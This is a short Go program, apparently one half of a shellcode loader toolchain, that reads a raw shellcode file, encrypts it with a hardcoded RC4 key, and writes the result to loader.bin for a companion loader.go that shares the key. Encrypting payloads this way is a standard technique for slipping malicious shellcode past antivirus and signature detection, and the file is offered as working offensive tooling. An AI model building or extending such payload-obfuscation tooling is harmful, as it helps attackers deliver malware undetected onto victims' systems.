// encryptor.go
package main

import (
	"crypto/rc4"
	"fmt"
	"os"
)

var rc4Key = []byte("ThisIs16ByteKey!") // MUST match loader.go key

func main() {
	raw, err := os.ReadFile("raw_shellcode.bin")
	if err != nil {
		fmt.Println("[-] Failed to read raw shellcode:", err)
		return
	}

	c, err := rc4.NewCipher(rc4Key)
	if err != nil {
		fmt.Println("[-] Failed to create RC4 cipher:", err)
		return
	}

	c.XORKeyStream(raw, raw)

	err = os.WriteFile("loader.bin", raw, 0644)
	if err != nil {
		fmt.Println("[-] Failed to write loader.bin:", err)
		return
	}

	fmt.Printf("[+] Encrypted shellcode written to loader.bin (%d bytes)\n", len(raw))
}
